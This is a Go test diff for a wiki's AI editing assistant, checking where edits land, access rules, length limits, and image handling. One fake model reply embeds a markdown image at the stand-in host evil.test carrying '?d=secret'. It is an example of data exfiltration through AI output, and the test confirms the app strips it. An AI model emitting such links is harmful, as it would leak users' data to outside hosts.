@@ -299,3 +299,153 @@ func TestAIPageAndStatus(t *testing.T) {
 		t.Errorf("status for a viewer: %+v", st)
 	}
 }
+
+func TestEditorAssistantPlacesAndProtects(t *testing.T) {
+	e := newPropEnv(t)
+	fm := &fakeModel{}
+	e.srv.EnableAI(fm, 100)
+	post := func(who reqOpt, body map[string]string) (int, map[string]any) {
+		return e.postAI(who, "/_api/ai/edit", body)
+	}
+	base := map[string]string{"space": "main", "before": "# T\n\nTeh cat.\n", "selected": "", "after": "\nEnd.\n"}
+	with := func(k, v string) map[string]string {
+		m := map[string]string{}
+		for a, b := range base {
+			m[a] = b
+		}
+		m[k] = v
+		return m
+	}
+
+	// Off for the space until switched on.
+	fm.reply = "@@replace\nx"
+	if code, _ := post(e.ed, with("instruction", "fix")); code != 403 {
+		t.Errorf("not switched on: %d", code)
+	}
+	e.setAI(e.sp, true)
+
+	// Fixing the whole page replaces the page and keeps its edges.
+	fm.reply = "@@replace\n# T\n\nThe cat.\n\nEnd."
+	code, out := post(e.ed, with("instruction", "Fix spelling and grammar"))
+	if code != 200 || out["mode"] != "replace" || out["place"] != "page" || out["text"] != "# T\n\nThe cat.\n\nEnd.\n" {
+		t.Errorf("fix page: %d %v", code, out)
+	}
+	if !strings.Contains(fm.last(), "Teh cat.") || !strings.Contains(fm.last(), "Instruction: Fix spelling and grammar") {
+		t.Errorf("the model was not given the page and the instruction:\n%s", fm.last())
+	}
+
+	// A selection is what gets replaced; its surrounding spaces survive.
+	fm.reply = "@@replace\n  The cat."
+	sel := with("selected", "  Teh cat.\n")
+	sel["instruction"] = "fix"
+	if code, out = post(e.ed, sel); code != 200 || out["place"] != "selection" || out["text"] != "  The cat.\n" {
+		t.Errorf("fix selection: %d %v", code, out)
+	}
+
+	// New content goes to the end unless the instruction says "here"; a selection counts as a position.
+	fm.reply = "@@new\n- one\n- two"
+	if _, out = post(e.ed, with("instruction", "outline as a bulleted list")); out["mode"] != "insert" || out["place"] != "end" || out["text"] != "- one\n- two" {
+		t.Errorf("new content: %v", out)
+	}
+	for _, ins := range []string{"insert a table of 3 columns and 5 rows", "a table here", "write the date at the cursor"} {
+		if _, out = post(e.ed, with("instruction", ins)); out["place"] != "cursor" {
+			t.Errorf("%q: %v", ins, out)
+		}
+	}
+	s2 := with("selected", "Teh cat.")
+	s2["instruction"] = "summarize this"
+	if _, out = post(e.ed, s2); out["place"] != "cursor" {
+		t.Errorf("new content with a selection: %v", out)
+	}
+
+	fm.reply = "@@replace\nMe and he went.\n```markdown\n# Notes\n```"
+	sel2 := with("selected", "Me and him goes.")
+	sel2["instruction"] = "fix"
+	if _, out = post(e.ed, sel2); out["text"] != "Me and he went." {
+		t.Errorf("echoed context: %v", out)
+	}
+
+	// The model is told which images the library holds and how to write them.
+	if rec := e.do("POST", "/main/_assets?name=henry-sandbox.png", string(pngBytes(t, 4)), header("Content-Type", "image/png"), e.ed); rec.Code/100 != 2 {
+		t.Fatalf("upload: %d %s", rec.Code, rec.Body.String())
+	}
+	fm.reply = "@@new\n![Henry in the sandbox](henry-sandbox.png)"
+	if _, out = post(e.ed, with("instruction", "insert the sandbox picture here")); out["text"] != "![Henry in the sandbox](henry-sandbox.png)" {
+		t.Errorf("a library image was changed: %v", out)
+	}
+	if !strings.Contains(fm.last(), "<images>\nhenry-sandbox.png\n</images>") {
+		t.Errorf("the library was not offered:\n%s", fm.last())
+	}
+
+	// A reply without its tag is judged by the instruction.
+	fm.reply = "# T\n\nThe cat.\n\nEnd."
+	if _, out = post(e.ed, with("instruction", "fix spelling")); out["mode"] != "replace" {
+		t.Errorf("untagged fix: %v", out)
+	}
+	fm.reply = "| a | b |\n|---|---|"
+	if _, out = post(e.ed, with("instruction", "a table with 2 columns")); out["mode"] != "insert" {
+		t.Errorf("untagged table: %v", out)
+	}
+
+	// Images that would call out to another site are dropped.
+	fm.reply = "@@new\nLook ![x](https://evil.test/p.png?d=secret)"
+	if _, out = post(e.ed, with("instruction", "add")); strings.Contains(out["text"].(string), "evil.test") {
+		t.Errorf("external image: %v", out)
+	}
+
+	// An empty answer and an unfinished rewrite never change the text.
+	fm.reply = "@@replace\n   "
+	if code, _ = post(e.ed, with("instruction", "fix")); code != 502 {
+		t.Errorf("empty answer: %d", code)
+	}
+	long := strings.Repeat("word ", 7000)
+	fm.reply = "@@replace\nsomething short"
+	big := with("before", long)
+	big["instruction"] = "fix"
+	if code, out = post(e.ed, big); code != 422 {
+		t.Errorf("replacing a page too long to send whole: %d %v", code, out)
+	}
+	if got := fm.last(); strings.Contains(got, long) {
+		t.Error("a long page was sent in full")
+	}
+	big["selected"] = "Teh cat."
+	if code, _ = post(e.ed, big); code != 200 {
+		t.Errorf("a selection in a long page: %d", code)
+	}
+
+	// Who may use it.
+	if code, _ = post(e.view, with("instruction", "fix")); code != 403 {
+		t.Errorf("viewer: %d", code)
+	}
+	if code, _ = post(e.sug, with("instruction", "fix")); code != 200 {
+		t.Errorf("suggester: %d", code)
+	}
+	if code, _ = post(e.ed, with("instruction", "  ")); code != 400 {
+		t.Errorf("no instruction: %d", code)
+	}
+	if rec := e.do("POST", "/_api/ai/edit", `{"space":"main","instruction":"x"}`); rec.Code != 401 {
+		t.Errorf("anonymous: %d", rec.Code)
+	}
+}
+
+func TestEditorShowsTheAssistantOnlyWhereAIIsOn(t *testing.T) {
+	e := newPropEnv(t)
+	e.do("PUT", "/main/doc", "# Doc\n", e.mdT, e.ed)
+	page := func(who reqOpt) string {
+		return e.do("GET", "/main/doc?edit", "", who, header("Accept", "text/html")).Body.String()
+	}
+	if strings.Contains(page(e.ed), `id="assist"`) {
+		t.Error("the assistant shows without a model")
+	}
+	e.srv.EnableAI(&fakeModel{}, 100)
+	if strings.Contains(page(e.ed), `id="assist"`) {
+		t.Error("the assistant shows in a space that has not switched AI on")
+	}
+	e.setAI(e.sp, true)
+	if !strings.Contains(page(e.ed), `id="assist"`) {
+		t.Error("no assistant in the editor of a space with AI on")
+	}
+	if !strings.Contains(e.do("GET", "/main/?create", "", e.ed, header("Accept", "text/html")).Body.String(), `id="assist"`) {
+		t.Error("no assistant when creating a page")
+	}
+}
